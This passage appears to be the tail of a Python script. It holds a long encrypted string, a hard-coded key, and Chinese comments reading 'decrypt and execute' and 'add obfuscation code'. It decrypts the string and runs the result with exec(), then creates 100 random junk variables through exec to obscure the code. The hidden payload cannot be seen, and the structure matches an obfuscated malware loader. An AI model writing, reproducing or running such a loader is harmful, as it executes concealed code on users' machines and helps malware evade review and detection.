TCo~HJDgY8zSSATB5FQFw6Fp2XLL4V^949JYODI1fJt18oc?fYAEKD~Z0u2yR3{fE@G#)GhNH!J&I1X(ICKe2CASDPLD;)#_FD`j5OcPQn7#B$dLmCi6Ra7@CECoFoG6)nVHW^euDG35l5hE>LOBqERLk>9^09|w)16~6JDl#fD2}D{uDjFsP0}3oY9x6vBL{kU{P8k_HcLP)oem?~|R!}A|2|8p*Xdh1(P9+EiPat(R1Ux@Da~CsYAu|m-3m8lUFBuReX9GD~16&;%Kv-lf3JVhk07^7J4Ol4<8a!5C07P#gVhsW`C|@=^Q6FIk8$1Od4<j}*dm1WG8x2xBF;{v4TM12D8chK*O)L%wL<9?1Vp36W1qTvMGzkj}3la%115+m#P7f0}drV+TPC^P75HUUmEmuDkT~AO011E1I7g{PVMk@^xU=nc;C|fK#cS=WpEn5{*EgTjjE-HClYXk*MF)RpS6&NcA00jmMEFej0Gdwa5F)2<~NeX-jeK0^H0V*3GRvKXnM<Q)Za$6Au7D*^1Twf(E78xK1P%#oYMF=i8b5~_2D>pPEB>*vKASY%kBp*mv5L$m5btG9S3l{`3Vhs&MT^V&iaXTLjAyIh*DlQfaNg8_r3pxu35(`=%NG=H~DLQmBIyVFqVLEbHHeDS64qOltOEfw`0RszQ1RQxFQyC^(00dMSCmISEAPFNcBLEHnNhLM~2QngO5GfiCOagdPE+IV>V;6G{6)y%EFC-!eQ3fqqK1w<-ZyqFF87B`nB|R@SIR!6MEkHURKSdEyZ3-G*QXm9#Mo>ChAq#6yDgrxhAT$jSFFachT^er#Q(X>AOhEw>Zd(926$xhpD+C26Aq+82UpZ1*IWY|ha8oJ=5-LkzKq!1fG%zk496JCgcr9oqH!)c;H9lrD7*#+aHbyN9YzPrHL?AUpA`3EQD;*I^4=Pb3I};6DYbrh%Fdq#L69ocR9zr5sIy?g%WLX*>5&{e<I0R%iRwykJ7z0{zW=kSjEGQQe6$=b97#?su2`*4xSTQ|1ata?&1ut6}RX;B}Nk21EA|@>#2Nn=bA~skg3NI{CUN!<>83`$P2SNq~MjCM=d;>FMV?i+n2v1HM9929&8W1@UCm>dASQ9@8UR3}OF*pPP02g}=Bq&os1yFbe4oyi?T1EvgMJYKJ16nEodrKb^bp|{y2Q(BV95y>fek&U@GYAE820}4SAQf#aIX6BsJ{b%lQ9(%!M?C@{PZv5pAS6p3c^MTf4G(Ne3{q7p3_k%f5*#K^IyQC=Z5vKpQ(p}ZZUHe3R82cT14lp>JV^pyG8-5(TRU@IUIaEZUn3wY5G8RpIb9@KCs-vgaWfB9Kt(bKT?IE^W-1e30zL-}OB_5NMH?R?Ar1{YEFp0jR$U!fLoqxtKr&JrIU`3p8$2cyMJE$b3l9@4A}J6REE+XWM^=9p12<Iw0|!$QWDFq;Egm>O4lO4y0}FXrGA<feIwg1nMJ-Yj5Ci}wdMRpAM<#nq92x)>Y%d2~1}jht99<<1dLa!#Ivx}@MI#dzC=ekueN9;|bxAJ}6fQ_y6cQ*+L>)g0PFF1;cQ<M&HzpraF<U7#1r~EUC|XrRP5=}`9|t@xHXbDlSuZjdEG&9be>+tibu~67A_^iRBtIEFUQQqx8UZ;BUso&-B3maZ5<>$AcMSnnT?iUKHw0lqXgvT3GFufiP%Ci<3=Ag<A}Cl4BR?!4AyPd^3rZ0!0U;&<SUe;%V=!<kR$VdzI2adZbx1D~9RL9-P9Y0D1vDx<OF2>tRRtnj1yyYYeJdIj2n+{SSP@hn3@sv6Yadw-Pg^y8UI1x3Dk1?_J|ZrEaUlXZFA-V=5*1+sc^eA?N+Sw*O$=x*C@v2Q2t5`o0xxhc7eWI7BLX)~6dX1@MOQ`}ehVoEGc$2DFkB@85+4a#8#Yd}P&PFtWi1IC6&oNYOk6Z06ag&|4>=Aua3pgn8WsyHGqhJnRt6jhNn2KWP+Dva2wHNQT5e=kJ$D8Q7Z^<d9vUJOKnx5MSqKX+RRnkl3;-$?E=OpLKm;Qg3l#(ls%SJEQ&&w~3wvWqHnmX(2oWM0EejVSon{mY4-5z_0vsp?=wliS3Jz6%>}EPvSPdf(B?<u~RBS?PxqTM}84R6%Rsb6X6dMsQMI3@@00=YyA`b|RLI5oa2MR=Q0&PchG8cSmd26{sRR=u{1{yOSkY@onBpy2(7aR$*dJQNULKhtw3JwR5JOVi!9swsGCJO*1L2N>6Ls?BpP);>@GG%zMeh&sIL>4F-A5TVeN@iqMM<3d2V|ndqfNV#2XB>L!J+o<Mwk&{QOz94WOm1vh!xGXD^b-F9;RDkd<6>OCeowSb7`<OWyl!@<O<vSR_fGP7w|-dBXuLo*;$k_scXP8-0KQgPxo2^sLRpbeM}1Ylb6L%Op?+bYB18Biq<VkSZ^v7|d_|ICX6`PFR(aNR!(+U7T)I|RvM;4!Yv*3lEWT4pxng3YPD&P8M{GhuY728|aBekdGG%xeS!-iTM0Z$jZ5vl}N^ZVYG#D@$aCvQM0!T-6GQWHe0S*A;HXT=PZD}-qN^WGVPf#xe2MhrWP8@A?GG%#cd20~IHg8y-ZfHkxs%}PxM^2J!L8)y^pl)TPGDoOtTf1Xu=5KnwZA+GOXuf20muz6WV_UsxQocu4!eM%ADQfdC#&240J!s}ox^8Ay7j5cJlX-7wAaA#HFk~oeiECj?W^Sl%Z)g^Bx@KutVw^%|VqBeReQ#ofEM<9b`ETPLwm8{0=`hE9&SB(P$78}|5q529Z~"
# 解密密钥
key = "6oXnmiFsJndVGlBkcymipnGt2exjykcJ"

# 解密并执行
code_obj = decrypt(encrypted_code, key)
if code_obj:
    exec(code_obj)
else:
    print("Decryption failed")

# 添加混淆代码
for i in range(100):
    var_name = f"_var_{i}"
    exec(f"{var_name} = os.urandom(32)")
